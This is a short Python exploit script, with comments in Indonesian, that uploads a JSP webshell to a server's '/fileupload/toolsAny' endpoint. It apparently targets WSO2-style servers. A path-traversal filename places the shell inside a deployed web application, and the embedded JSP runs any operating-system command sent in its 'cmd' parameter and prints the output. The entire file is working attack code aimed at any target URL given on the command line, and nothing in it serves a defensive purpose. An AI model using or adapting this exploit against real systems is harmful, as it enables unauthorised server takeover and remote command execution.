import requests
import sys

def upload_shell(target_url, shell_filename):
    # URL tujuan upload file
    url = f"{target_url}/fileupload/toolsAny"

    # Header request
    headers = {
        'User-Agent': 'curl/7.85.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close'
    }

    # Isi file JSP webshell
    webshell_content = f"""<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {{
        String s = null;
        try {{
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) {{ output += s+"</br>"; }}
        }} catch(IOException e) {{ e.printStackTrace(); }}
    }}
%>
<pre><%=output %></pre>"""

    # Data form untuk upload file
    files = {
        "../../../../repository/deployment/server/webapps/authenticationendpoint/webshell.jsp": (shell_filename, webshell_content, 'application/octet-stream')
    }

    try:
        # Mengirimkan request POST
        response = requests.post(url, headers=headers, files=files, verify=False)  # verify=False untuk SSL self-signed
        
        # Menampilkan hasil request
        if response.status_code == 200:
            print(f"[+] Webshell berhasil diupload ke {target_url}")
            print("Response:", response.text)
        else:
            print(f"[-] Upload gagal. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Terjadi kesalahan saat mengirim request: {e}")

# Mengecek apakah ada parameter baris perintah
if len(sys.argv) != 3:
    print("Penggunaan: python fileku.py <target_url> <shell_filename>")
    sys.exit(1)

# Menangkap parameter dari baris perintah
target_url = sys.argv[1]
shell_filename = sys.argv[2]

# Memanggil fungsi eksploitasi
upload_shell(target_url, shell_filename)
